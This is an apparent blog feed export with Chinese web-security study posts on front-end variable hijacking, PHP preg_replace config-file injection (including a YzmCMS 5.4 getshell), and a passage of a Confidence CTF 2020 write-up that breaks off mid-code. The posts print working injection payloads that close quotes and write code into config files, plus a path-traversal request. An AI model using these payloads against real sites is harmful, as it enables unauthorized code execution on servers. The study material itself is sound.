class="attr">src</span>=<span class="string">"http://www.baidu.com"</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">"exploit()"</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">     <span class="keyword">var</span> test1=<span class="number">1</span>;</span></span><br><span class="line"><span class="actionscript">     <span class="keyword">var</span> lih3iu = <span class="string">"Hijack me"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 不能用alert ，alert 会尝试访问 VUL window对象的特有方法，会爆跨域错误</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(lih3iu);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到lih3iu变量被成功设置为一个window变量，这也是这个漏洞的局限性，只可将漏洞劫持为一个window变量，对于这个漏洞其实还是有一些问题的（比如一些同源跨域的问题，有兴趣的师傅可以私我一起讨论一下）</p><p><img src="https://s1.ax1x.com/2020/04/05/GrePh9.png" alt="GrePh9.png"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞/#more" target="_blank" rel="noopener">http://wonderkun.cc/2019/07/01/%E5%89%8D%E7%AB%AF%E4%B8%AD%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E/#more</a></p><p><a href="https://hpdoger.cn/2019/07/02/前端全局变量劫持/" target="_blank" rel="noopener">https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;忙完了一些杂事，学一些新的东西吧（虽说心情有点难受&lt;/p&gt;
&lt;h3 id=&quot;iframe之间的访问与同源关系&quot;&gt;&lt;a href=&quot;#ifra
      
    
    </summary>
    
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>正则与经典写配置漏洞学习</title>
    <link href="http://yoursite.com/2020/03/24/%E6%AD%A3%E5%88%99%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/03/24/%E6%AD%A3%E5%88%99%E4%B8%8E%E7%BB%8F%E5%85%B8%E5%86%99%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-03-23T17:01:45.000Z</published>
    <updated>2020-03-23T17:02:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>看到P牛的小密圈发了这篇文章 感觉很棒 所以来学习一下.</p><h3 id="前置知识铺垫"><a href="#前置知识铺垫" class="headerlink" title="前置知识铺垫"></a>前置知识铺垫</h3><h4 id="single-line和multi-line"><a href="#single-line和multi-line" class="headerlink" title="single-line和multi-line"></a>single-line和multi-line</h4><p>single-line与multi-line分别对应了/s和/m修饰符。</p><h5 id="multi-line"><a href="#multi-line" class="headerlink" title="multi-line"></a>multi-line</h5><p>multi-line表示按行来进行正则匹配：将待匹配的文本利用换行符分割，并对每一部分进行正则匹配，将每部分的结果用or进行运算，得出最终的结果。</p><p>举一个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(preg_match(<span class="string">'/^a[a-z]+z$/m'</span>, <span class="string">"abbz\n123"</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回1</span></span><br></pre></td></tr></table></figure><h5 id="single-line"><a href="#single-line" class="headerlink" title="single-line"></a>single-line</h5><p>将待匹配文本视作单行，并且换行符不再作为换行的标志，. 可匹配换行符</p><h4 id="默认情况的正则-不加修饰符"><a href="#默认情况的正则-不加修饰符" class="headerlink" title="默认情况的正则(不加修饰符)"></a>默认情况的正则(不加修饰符)</h4><p>对于如下正则：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/^a[a-z]+z$/'</span>, <span class="string">"abbz\nccz"</span>));</span><br><span class="line"></span><br><span class="line">返回<span class="number">0</span> 说明默认情况下非多行匹配</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(preg_match(<span class="string">'/^a.+z$/'</span>, <span class="string">"abbz\nccz"</span>));</span><br><span class="line"></span><br><span class="line">返回<span class="number">0</span> 说明无法匹配换行符</span><br></pre></td></tr></table></figure><p>所以在默认情况下代表着：single-line且.不会匹配换行符</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>引用一下p牛的总结</p><ul><li>不加s或m修饰符 -&gt; single line，但 . 不能匹配换行符</li><li>单独加s修饰符 -&gt; single line，且 . 匹配包括换行符在内的所有字符</li><li>单独加m修饰符 -&gt; multi line</li><li>同时加m和s两个修饰符 -&gt; multi line，且 . 匹配包括换行符在内的所有字符</li></ul><h3 id="配置漏洞与其变形"><a href="#配置漏洞与其变形" class="headerlink" title="配置漏洞与其变形"></a>配置漏洞与其变形</h3><h4 id="正则贪婪模式且无-s修饰符"><a href="#正则贪婪模式且无-s修饰符" class="headerlink" title="正则贪婪模式且无/s修饰符"></a>正则贪婪模式且无/s修饰符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>利用.*不会匹配换行的特性，利用换行绕过</p><p>第一次：api=a’;%0aphpinfo();//</p><p>第二次：api=aaa</p><h4 id="正则贪婪模式且有-s修饰符"><a href="#正则贪婪模式且有-s修饰符" class="headerlink" title="正则贪婪模式且有/s修饰符"></a>正则贪婪模式且有/s修饰符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>由于/s修饰符 所以无法利用换行绕过，不过可以用$0或者\0来引入单引号进行闭合，$0在preg_replace函数中代表着完整的匹配模式或者匹配文本</p><p>第一次</p><p>api=;phpinfo();//</p><p>对应：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$API = <span class="string">';phpinfo();//'</span>;</span><br></pre></td></tr></table></figure><p>第二次</p><p>api=$0</p><p>对应</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$API = <span class="string">'$API = '</span>;phpinfo();<span class="comment">//';';</span></span><br></pre></td></tr></table></figure><p>成功在配置文件中写入任意内容</p><h4 id="正则非贪婪模式且无-s修饰符"><a href="#正则非贪婪模式且无-s修饰符" class="headerlink" title="正则非贪婪模式且无/s修饰符"></a>正则非贪婪模式且无/s修饰符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和之前唯一不同的是现在是非贪婪的匹配模式，也就意味着匹配到第一个单引号之后就不会接着往下继续匹配了</p><p>所以我们换行和不换行都可以绕过了</p><p>Payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure><h4 id="正则非贪婪模式且有-s修饰符"><a href="#正则非贪婪模式且有-s修饰符" class="headerlink" title="正则非贪婪模式且有/s修饰符"></a>正则非贪婪模式且有/s修饰符</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/\\\$API = '.*?';/s"</span>, <span class="string">"\$API = '&#123;$api&#125;';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>虽然加了/s修饰符，但是因为为非贪婪模式，上面的payload同样适用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure><h4 id="define情况下的贪婪且-s修饰"><a href="#define情况下的贪婪且-s修饰" class="headerlink" title="define情况下的贪婪且/s修饰"></a>define情况下的贪婪且/s修饰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>和第一种一样，只是换了下变量的定义方式，换行绕过即可</p><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一次</span><br><span class="line">api&#x3D;a&#39;);%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">第二次</span><br><span class="line">api&#x3D;a</span><br></pre></td></tr></table></figure><h4 id="define情况下的贪婪且无-s修饰"><a href="#define情况下的贪婪且无-s修饰" class="headerlink" title="define情况下的贪婪且无/s修饰"></a>define情况下的贪婪且无/s修饰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>因为有不可闭合的单引号，所以这种情况下无法使用$0</p><p>不过可以使用这个trick: <code>preg_replace</code> 在替换的时候会吃掉转义符 来进行引号闭合</p><p>preg_match可将<code>\\</code>转化为<code>\</code> <strong>这也就意味着…其实用这种方式可以逃逸掉这篇文章里所有的单引号</strong></p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">api&#x3D;a\%27);phpinfo();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>得到的配置文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&#39;API&#39;, &#39;a\\&#39;);phpinfo();&#x2F;&#x2F;&#39;);</span><br></pre></td></tr></table></figure><h4 id="define情况下的非贪婪且有-s修饰"><a href="#define情况下的非贪婪且有-s修饰" class="headerlink" title="define情况下的非贪婪且有/s修饰"></a>define情况下的非贪婪且有/s修饰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure><h4 id="define情况下的非贪婪且无-s修饰"><a href="#define情况下的非贪婪且无-s修饰" class="headerlink" title="define情况下的非贪婪且无/s修饰"></a>define情况下的非贪婪且无/s修饰</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$api = addslashes($_GET[<span class="string">'api'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./option.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">"/define\('API', '.*?'\);/s"</span>, <span class="string">"define('API', '&#123;$api&#125;');"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./option.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>Payload如下：</p><p>第一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aa&#39;;phpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br><span class="line">第二种</span><br><span class="line">aa&#39;;%0aphpinfo();&#x2F;&#x2F;</span><br><span class="line">aa</span><br></pre></td></tr></table></figure><h3 id="几个例子"><a href="#几个例子" class="headerlink" title="几个例子"></a>几个例子</h3><h4 id="YzmCMS-5-4后台getshell"><a href="#YzmCMS-5-4后台getshell" class="headerlink" title="YzmCMS 5.4后台getshell"></a>YzmCMS 5.4后台getshell</h4><p>漏洞函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_config</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">    $configfile = YZMPHP_PATH.<span class="string">'common'</span>.DIRECTORY_SEPARATOR.<span class="string">'config/config.php'</span>;</span><br><span class="line">    <span class="keyword">if</span>(!is_writable($configfile)) showmsg(<span class="string">'Please chmod '</span>.$configfile.<span class="string">' to 0777 !'</span>, <span class="string">'stop'</span>);</span><br><span class="line">    $pattern = $replacement = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>($config <span class="keyword">as</span> $k=&gt;$v) &#123;</span><br><span class="line">        $pattern[$k] = <span class="string">"/'"</span>.$k.<span class="string">"'\s*=&gt;\s*([']?)[^']*([']?)(\s*),/is"</span>;</span><br><span class="line">        $replacement[$k] = <span class="string">"'"</span>.$k.<span class="string">"' =&gt; \$&#123;1&#125;"</span>.$v.<span class="string">"\$&#123;2&#125;\$&#123;3&#125;,"</span>;                    </span><br><span class="line">    &#125;</span><br><span class="line">    $str = file_get_contents($configfile);</span><br><span class="line">    $str = preg_replace($pattern, $replacement, $str);</span><br><span class="line">    <span class="keyword">return</span> file_put_contents($configfile, $str, LOCK_EX);       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到$replacement变量是由字符拼接而来，并且${1}匹配的是单引号，那么我们就可以用$1来闭合前面的单引号，${1}等价于$1的，接着跟进调用了set_config的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        yzm_base::load_common(<span class="string">'function/function.php'</span>, <span class="string">'admin'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'mail_inbox'</span>]) &amp;&amp; $_POST[<span class="string">'mail_inbox'</span>])&#123;</span><br><span class="line">                <span class="keyword">if</span>(!is_email($_POST[<span class="string">'mail_inbox'</span>])) showmsg(L(<span class="string">'mail_format_error'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload_types'</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'upload_types'</span>])) showmsg(<span class="string">'允许上传附件类型不能为空！'</span>, <span class="string">'stop'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $arr = <span class="keyword">array</span>();</span><br><span class="line">            $config = D(<span class="string">'config'</span>);</span><br><span class="line">            <span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">                <span class="keyword">if</span>(in_array($key, <span class="keyword">array</span>(<span class="string">'site_theme'</span>,<span class="string">'watermark_enable'</span>,<span class="string">'watermark_name'</span>,<span class="string">'watermark_position'</span>))) &#123;</span><br><span class="line">                    $value = safe_replace(trim($value));</span><br><span class="line">                    $arr[$key] = $value;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>($key!=<span class="string">'site_code'</span>)&#123;</span><br><span class="line">                        $value = htmlspecialchars($value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                $config-&gt;update(<span class="keyword">array</span>(<span class="string">'value'</span>=&gt;$value), <span class="keyword">array</span>(<span class="string">'name'</span>=&gt;$key));</span><br><span class="line">            &#125;</span><br><span class="line">            set_config($arr);</span><br><span class="line">            delcache(<span class="string">'configs'</span>);</span><br><span class="line">            showmsg(L(<span class="string">'operation_success'</span>), <span class="string">''</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看出是从POST取值并且检查key是否在规定的数组中，如果在的话，进行一次内容过滤，然后赋给$arr数组，并且由于array数组中键可以对应着函数</p><p>比如 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x3D;&gt;&#39;x&#39;,foo()</span><br></pre></td></tr></table></figure><p>所以直接赋值为我们之前单引号闭合的payload就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1,payload,$1</span><br></pre></td></tr></table></figure><h4 id="一个常见的绕过"><a href="#一个常见的绕过" class="headerlink" title="一个常见的绕过"></a>一个常见的绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^want$/'</span>, $_GET[<span class="string">'exp'</span>]) &amp;&amp; $_GET[<span class="string">'exp'</span>] !== <span class="string">'want'</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"test"</span>;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对于这个过滤条件 我们可以用exp=want%0a进行绕过</p><p>原理为$可以对换行符进行匹配</p><p>同样的漏洞还有Apache换行解析漏洞，也就是shell.php\n可以以php的形式解析，也是利用了$可以匹配换行符导致的。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;看到P牛的小密圈发了这篇文章 感觉很棒 所以来学习一下.&lt;/p&gt;
&lt;h3 id=&quot;前置知识铺垫&quot;&gt;&lt;a href=&quot;#前置知识铺垫&quot; cla
      
    
    </summary>
    
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Confidence CTF 2020-Web</title>
    <link href="http://yoursite.com/2020/03/18/Confidence-CTF-2020-Web/"/>
    <id>http://yoursite.com/2020/03/18/Confidence-CTF-2020-Web/</id>
    <published>2020-03-18T11:46:11.000Z</published>
    <updated>2020-03-19T01:26:24.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Catweb"><a href="#Catweb" class="headerlink" title="Catweb"></a>Catweb</h4><p>先看一下题目的js代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getNewCats</span>(<span class="params">kind</span>) </span>&#123;</span><br><span class="line">$.getJSON(<span class="string">'http://catweb.zajebistyc.tf/cats?kind='</span>+kind, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(data.status != <span class="string">'ok'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">$(<span class="string">'#cats_container'</span>).empty();</span><br><span class="line">cats = data.content;</span><br><span class="line">cats.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">cat</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> newDiv = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">newDiv.innerHTML = <span class="string">'&lt;img style="max-width: 200px; max-height: 200px" src="static/'</span>+kind+<span class="string">'/'</span>+cat+<span class="string">'" /&gt;'</span>;</span><br><span class="line">$(<span class="string">'#cats_container'</span>).append(newDiv);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">$(<span class="string">'#cat_select'</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> kind = $(<span class="keyword">this</span>).val();</span><br><span class="line">history.pushState(&#123;&#125;, <span class="string">''</span>, <span class="string">'?'</span>+kind)</span><br><span class="line">getNewCats(kind);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">var</span> kind = <span class="built_in">window</span>.location.search.substring(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(kind == <span class="string">""</span>)</span><br><span class="line">&#123;</span><br><span class="line">kind = <span class="string">'black'</span>;</span><br><span class="line">&#125;</span><br><span class="line">getNewCats(kind);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在getNewCats函数中通过返回的json数据渲染div标签中的img图像，默认为黑色🐱，通过切换不同的颜色来渲染出不同🐱🐱的颜色。</p><p>很容易发现有目录穿越这个漏洞，并且可以通过目录穿越发现flag位于/templates/flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http:&#x2F;&#x2F;catweb.zajebistyc.tf&#x2F;cats?kind&#x3D;..</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回结果：</span><br><span class="line">&#123;</span><br><span class="line">status: &quot;ok&quot;,</span><br><span class="line">content: [</span><br><span class="line">&quot;prestart.sh&quot;,</span><br><span class="line">&quot;uwsgi.ini&quot;,</span><br><span class="line">&quot;main.py&quot;,</span><br><span class="line">&quot;templates&quot;,</span><br><span class="line">&quot;static&quot;,</span><br><span class="line">&quot;app.py&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有另一个report通过，可以把url发给后台的bot 并且bot会不加任何验证的进行点击操作</p><p>比如我们发一个</p><figure class="highlight 